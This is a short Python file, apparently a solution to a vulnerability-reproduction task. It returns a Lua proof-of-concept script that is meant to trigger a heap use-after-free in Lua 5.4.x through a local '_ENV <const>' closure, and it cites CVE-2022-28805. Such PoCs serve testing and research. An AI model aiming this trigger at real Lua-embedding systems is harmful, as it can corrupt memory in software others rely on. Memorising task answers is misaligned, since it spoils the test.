import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua 5.4.x
        related to _ENV <const> declarations (CVE-2022-28805).
        """
        # The vulnerability exists because declaring _ENV as <const> in a local scope
        # can cause the compiler to incorrectly handle the upvalue creation for the 
        # inner function. This leads to an improper closure of the upvalue (it isn't 
        # moved from stack to heap), or failure to track the dependency. 
        # When the parent function returns and garbage collection runs, the table 
        # assigned to _ENV is collected, but the inner function retains a reference 
        # to it (or the stack slot), leading to a Use-After-Free when accessed.
        
        poc = r"""
local function trigger()
  -- Declare _ENV as a local const table. 
  -- The bug causes the upvalue for this to be mishandled.
  local _ENV <const> = { x = 1 }
  
  -- Return a closure that accesses a global 'x'.
  -- This resolves to _ENV.x.
  return function() 
    return x 
  end
end

-- create the closure
local f = trigger()

-- Force garbage collection. 
-- Due to the bug, the _ENV table may be collected even though 'f' needs it.
collectgarbage()

-- Execute the closure. 
-- This will attempt to access the now-freed _ENV table to look up 'x'.
-- AddressSanitizer should detect a Heap-Use-After-Free here.
f()
"""
        return poc.encode('utf-8')